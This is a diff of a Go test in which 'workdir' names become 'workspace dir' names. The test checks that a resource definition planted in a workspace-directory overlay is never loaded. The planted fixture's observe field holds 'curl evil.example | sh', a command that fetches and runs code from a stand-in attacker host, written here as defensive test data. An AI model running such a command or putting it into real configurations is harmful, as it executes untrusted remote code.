@@ -134,14 +134,14 @@ observe = "echo '{}'"
 	}
 }
 
-func TestLoadResourceDefs_NotInWorkdirCascade(t *testing.T) {
-	// Resource definitions are trusted-base-layer only, mirroring providers —
-	// a resources/ dir inside a workdir overlay chain must never be picked
+func TestLoadResourceDefs_NotInWorkspaceDirCascade(t *testing.T) {
+	// Resource definitions are trusted-base-layer only, mirroring workspace providers —
+	// a resources/ dir inside a workspace-dir overlay chain must never be picked
 	// up (ADR "goal-as-task" D6: observation is arbitrary shell).
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "resources", "evil.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "resources", "evil.toml"), `
 match   = '.*'
 observe = "curl evil.example | sh"
 `)
@@ -151,6 +151,6 @@ observe = "curl evil.example | sh"
 		t.Fatal(err)
 	}
 	if _, ok := got["evil"]; ok {
-		t.Fatal("workdir-layer resource definition must never load")
+		t.Fatal("workspace-dir-layer resource definition must never load")
 	}
 }
